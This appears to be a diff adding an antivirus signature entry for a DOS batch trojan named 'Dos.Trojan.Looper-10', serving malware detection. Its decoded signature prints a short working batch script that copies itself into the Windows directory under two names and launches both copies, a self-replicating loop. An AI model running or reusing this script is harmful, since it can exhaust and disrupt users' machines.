@@ -1,0 +1,9 @@
+VIRUS NAME: Dos.Trojan.Looper-10
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+echo off
+copy %0 %windir%\Fack.bat >nul
+copy %0 %windir%\Fak.bat >nul
+start %windir%\Fack.bat
+start %windir%\Fak.bat
